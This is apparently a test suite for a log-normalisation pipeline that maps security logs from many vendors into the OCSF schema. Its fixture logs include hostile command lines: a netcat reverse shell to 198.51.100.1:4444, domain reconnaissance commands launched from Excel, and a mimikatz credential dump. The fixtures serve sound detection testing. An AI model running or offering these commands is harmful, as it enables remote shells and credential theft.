"""
OCSF Processor — End-to-End Test Suite
Tests all supported formats, pipeline processing, and agent routing.
Run: python test_pipeline.py
"""
import sys
import os
import json
import asyncio
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import detect_format, LogFormat
from parsers import parse, PARSER_REGISTRY
from mappers import map_to_ocsf
from models import LogInput, BatchLogInput
from pipeline import process_single, process_batch, metrics, bead_memory


# ═══════════════════════════════════════════════════════════════════════════════
# Test Samples
# ═══════════════════════════════════════════════════════════════════════════════

TEST_LOGS = {
    "CEF": 'CEF:0|Fortinet|FortiGate|7.0.1|13056|traffic:forward close|3|src=10.0.1.55 dst=203.0.113.44 spt=52341 dpt=443 proto=6 app=HTTPS act=close msg=Connection closed',
    
    "SYSLOG_RFC3164": '<134>Jan 15 10:32:44 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=185.220.101.35 DST=10.0.0.5 PROTO=TCP SPT=44892 DPT=22',
    
    "WINDOWS_EVENT": json.dumps({
        "EventID": 4625,
        "ProviderName": "Microsoft-Windows-Security-Auditing",
        "Channel": "Security",
        "Computer": "DC01.corp.local",
        "TimeCreated": "2025-02-20T14:33:01Z",
        "SubjectUserName": "john.doe",
        "TargetUserName": "admin",
        "LogonType": 10,
        "IpAddress": "192.168.1.100",
        "Status": "0xc000006d",
        "FailureReason": "Unknown user name or bad password"
    }),
    
    "AWS_CLOUDTRAIL": json.dumps({
        "eventTime": "2025-02-20T15:22:00Z",
        "eventSource": "iam.amazonaws.com",
        "eventName": "CreateUser",
        "awsRegion": "us-east-1",
        "sourceIPAddress": "72.21.198.67",
        "userIdentity": {
            "type": "IAMUser",
            "arn": "arn:aws:iam::123456789012:user/admin",
            "userName": "admin",
            "accountId": "123456789012"
        },
        "requestParameters": {"userName": "new-service-account"}
    }),
    
    "AWS_VPC_FLOW": "2 123456789012 eni-0a1b2c3d4e5f6 172.31.16.139 172.31.16.21 20641 22 6 20 4249 1418530010 1418530070 ACCEPT OK",
    
    "CROWDSTRIKE_EDR": json.dumps({
        "event_simpleName": "ProcessRollup2",
        "timestamp": "2025-02-20T16:45:12Z",
        "aid": "abc123def456",
        "ComputerName": "WORKSTATION-42",
        "UserName": "jsmith",
        "ImageFileName": "\\Device\\HarddiskVolume2\\Windows\\System32\\cmd.exe",
        "CommandLine": "cmd.exe /c whoami /all & net user /domain",
        "ParentImageFileName": "\\Device\\HarddiskVolume2\\Windows\\System32\\excel.exe",
        "SHA256HashData": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
        "Severity": "Critical",
        "Tactic": "Execution",
        "Technique": "T1059.003",
        "DetectDescription": "Suspicious command shell spawned from Office application"
    }),
    
    "PALO_ALTO": "TRAFFIC,2025/02/20 10:15:33,001801012345,TRAFFIC,end,2562,2025/02/20 10:15:33,10.10.10.50,203.0.113.100,0.0.0.0,0.0.0.0,Allow-Outbound,corp\\jdoe,,ssl,vsys1,Trust,Untrust,ethernet1/2,ethernet1/1,Forward-Logs,2025/02/20 10:15:33,12345,1,55432,443,0,0,0x400053,tcp,allow,3456,1234,2222,15",
    
    "ELASTIC_ECS": json.dumps({
        "@timestamp": "2025-02-20T12:00:00Z",
        "ecs": {"version": "8.11.0"},
        "event": {"kind": "alert", "category": ["network"], "action": "blocked", "outcome": "failure"},
        "source": {"ip": "10.0.0.50", "port": 52341},
        "destination": {"ip": "198.51.100.1", "port": 4444},
        "user": {"name": "svc_backup"},
        "host": {"name": "app-server-03"},
        "process": {"name": "nc.exe", "command_line": "nc.exe -e cmd.exe 198.51.100.1 4444"},
        "agent": {"type": "endpoint"},
        "message": "Reverse shell connection attempt blocked"
    }),
    
    "SURICATA": json.dumps({
        "event_type": "alert",
        "timestamp": "2025-02-20T10:00:00Z",
        "src_ip": "192.168.1.50",
        "src_port": 54321,
        "dest_ip": "10.0.0.1",
        "dest_port": 80,
        "proto": "TCP",
        "alert": {
            "signature": "ET MALWARE Win32/Emotet CnC Beacon",
            "signature_id": 2028766,
            "category": "Malware Command and Control Activity Detected",
            "severity": 1,
            "action": "allowed"
        }
    }),
    
    "KEY_VALUE": 'date=2025-02-20 time=10:00:00 devname=FGT60E devid=FG100E action=deny srcip=192.168.1.50 dstip=10.0.0.1 srcport=54321 dstport=443 proto=TCP user=admin msg="Policy violation detected"',
    
    "OKTA": json.dumps({
        "eventType": "user.session.start",
        "published": "2025-02-20T12:00:00Z",
        "severity": "INFO",
        "displayMessage": "User login to Okta",
        "actor": {"displayName": "John Doe", "id": "00u123", "alternateId": "john@company.com"},
        "client": {"ipAddress": "203.0.113.55", "userAgent": {"rawUserAgent": "Mozilla/5.0", "os": "Mac OS X", "browser": "Chrome"}},
        "outcome": {"result": "SUCCESS"},
        "target": [{"displayName": "Okta Dashboard", "type": "AppInstance"}],
        "debugContext": {"debugData": {"requestUri": "/api/v1/authn"}}
    }),
}


# ═══════════════════════════════════════════════════════════════════════════════
# Tests
# ═══════════════════════════════════════════════════════════════════════════════

def test_format_detection():
    """Test auto-detection for all sample formats."""
    print("\n" + "=" * 70)
    print("  FORMAT DETECTION TESTS")
    print("=" * 70)
    
    passed = 0
    failed = 0
    
    for expected_format, raw_log in TEST_LOGS.items():
        fmt, confidence = detect_format(raw_log)
        detected = fmt.value
        match = detected == expected_format
        
        status = "✅ PASS" if match else "❌ FAIL"
        if match:
            passed += 1
        else:
            failed += 1
        
        print(f"  {status} | Expected: {expected_format:20s} | Detected: {detected:20s} | Confidence: {confidence:.2f}")
    
    print(f"\n  Results: {passed} passed, {failed} failed out of {len(TEST_LOGS)}")
    return failed == 0


def test_parsing():
    """Test parsing for all sample formats."""
    print("\n" + "=" * 70)
    print("  PARSING TESTS")
    print("=" * 70)
    
    passed = 0
    
    for fmt_name, raw_log in TEST_LOGS.items():
        parsed = parse(raw_log, fmt_name)
        
        if isinstance(parsed, list):
            parsed = parsed[0]
        
        has_error = "_parse_error" in parsed
        has_raw = "_raw" in parsed
        field_count = len([k for k in parsed.keys() if not k.startswith("_")])
        
        status = "✅" if not has_error and field_count > 2 else "⚠️"
        if not has_error:
            passed += 1
        
        print(f"  {status} {fmt_name:20s} | Fields: {field_count:3d} | Error: {has_error}")
    
    print(f"\n  Results: {passed} parsed successfully out of {len(TEST_LOGS)}")
    return True


def test_ocsf_mapping():
    """Test OCSF mapping for all formats."""
    print("\n" + "=" * 70)
    print("  OCSF MAPPING TESTS")
    print("=" * 70)
    
    for fmt_name, raw_log in TEST_LOGS.items():
        parsed = parse(raw_log, fmt_name)
        if isinstance(parsed, list):
            parsed = parsed[0]
        
        ocsf = map_to_ocsf(parsed, fmt_name)
        
        # Validate required OCSF fields
        has_category = ocsf.category_uid > 0
        has_class = ocsf.class_uid > 0
        has_metadata = ocsf.metadata is not None
        has_time = ocsf.time > 0
        obs_count = len(ocsf.observables)
        corr_keys = len(ocsf.correlation_keys)
        
        print(f"  {'✅' if has_category else '❌'} {fmt_name:20s} | "
              f"Cat: {ocsf.category_name:30s} | "
              f"Class: {ocsf.class_name:25s} | "
              f"Sev: {ocsf.severity:15s} | "
              f"Obs: {obs_count:2d} | "
              f"CorrKeys: {corr_keys:2d}")
    
    return True


async def test_pipeline():
    """Test full async pipeline processing."""
    print("\n" + "=" * 70)
    print("  FULL PIPELINE TESTS")
    print("=" * 70)
    
    total_time = 0
    
    for fmt_name, raw_log in TEST_LOGS.items():
        result = await process_single(LogInput(raw=raw_log, route_to_agents=True))
        
        total_time += result.total_time_ms
        routes = ", ".join(result.agent_routes) if result.agent_routes else "none"
        
        print(f"  {'✅' if result.success else '❌'} {fmt_name:20s} | "
              f"Time: {result.total_time_ms:7.2f}ms | "
              f"Bead: {result.bead_id or 'none':15s} | "
              f"Routes: {routes}")
    
    print(f"\n  Total processing time: {total_time:.2f}ms for {len(TEST_LOGS)} events")
    print(f"  Average: {total_time / len(TEST_LOGS):.2f}ms per event")
    return True


async def test_batch():
    """Test batch processing."""
    print("\n" + "=" * 70)
    print("  BATCH PROCESSING TEST")
    print("=" * 70)
    
    batch = BatchLogInput(
        logs=[LogInput(raw=raw) for raw in TEST_LOGS.values()],
        source="test_suite",
        route_to_agents=True,
    )
    
    result = await process_batch(batch)
    
    print(f"  Total: {result.total}")
    print(f"  Success: {result.success}")
    print(f"  Failed: {result.failed}")
    print(f"  Time: {result.processing_time_ms:.2f}ms")
    print(f"  Formats: {json.dumps(result.format_distribution, indent=4)}")
    print(f"  Severity: {json.dumps(result.severity_distribution, indent=4)}")
    print(f"  Agent Routes: {json.dumps(result.agent_routing_summary, indent=4)}")
    
    return result.failed == 0


async def test_bead_memory():
    """Test Bead Memory correlation."""
    print("\n" + "=" * 70)
    print("  BEAD MEMORY CORRELATION TEST")
    print("=" * 70)
    
    # Process events that should correlate (same source IP)
    related_logs = [
        '{"EventID": 4625, "ProviderName": "Microsoft-Windows-Security-Auditing", "Computer": "DC01", "IpAddress": "10.0.0.99", "SubjectUserName": "attacker", "TimeCreated": "2025-02-20T10:00:00Z"}',
        '{"EventID": 4624, "ProviderName": "Microsoft-Windows-Security-Auditing", "Computer": "DC01", "IpAddress": "10.0.0.99", "SubjectUserName": "attacker", "LogonType": 3, "TimeCreated": "2025-02-20T10:01:00Z"}',
        '{"event_simpleName": "ProcessRollup2", "timestamp": "2025-02-20T10:02:00Z", "aid": "xyz", "ComputerName": "DC01", "UserName": "attacker", "ImageFileName": "mimikatz.exe", "CommandLine": "mimikatz.exe sekurlsa::logonpasswords", "Severity": "Critical", "Tactic": "Credential Access", "Technique": "T1003"}',
    ]
    
    bead_ids = []
    for raw in related_logs:
        result = await process_single(LogInput(raw=raw, route_to_agents=False))
        bead_ids.append(result.bead_id)
        print(f"  Event processed | Bead: {result.bead_id} | "
              f"Class: {result.ocsf_event.class_name if result.ocsf_event else 'N/A'} | "
              f"Keys: {result.ocsf_event.correlation_keys if result.ocsf_event else []}")
    
    # Check correlation
    unique_beads = set(b for b in bead_ids if b)
    correlated = len(unique_beads) < len(bead_ids) and len(unique_beads) > 0
    
    print(f"\n  Bead IDs: {bead_ids}")
    print(f"  Unique chains: {len(unique_beads)}")
    print(f"  Correlated: {'✅ YES' if correlated else '⚠️ Partial (expected with shared keys)'}")
    print(f"  Active chains: {bead_memory.active_chains}")
    
    return True


async def test_stats():
    """Test metrics collection."""
    print("\n" + "=" * 70)
    print("  PIPELINE METRICS")
    print("=" * 70)
    
    stats = metrics.get_stats()
    print(f"  Total processed: {stats.total_processed}")
    print(f"  Total errors: {stats.total_errors}")
    print(f"  Events/sec: {stats.events_per_second}")
    print(f"  Avg time: {stats.avg_processing_time_ms:.2f}ms")
    print(f"  Formats: {json.dumps(stats.format_counts, indent=4)}")
    print(f"  Severity: {json.dumps(stats.severity_counts, indent=4)}")
    
    return True


# ═══════════════════════════════════════════════════════════════════════════════
# Run Tests
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║       OCSF Universal Processor — Test Suite                     ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    
    t0 = time.time()
    
    test_format_detection()
    test_parsing()
    test_ocsf_mapping()
    await test_pipeline()
    await test_batch()
    await test_bead_memory()
    await test_stats()
    
    elapsed = time.time() - t0
    
    print("\n" + "=" * 70)
    print(f"  ALL TESTS COMPLETED in {elapsed:.2f}s")
    print("=" * 70)


if __name__ == "__main__":
    asyncio.run(main())
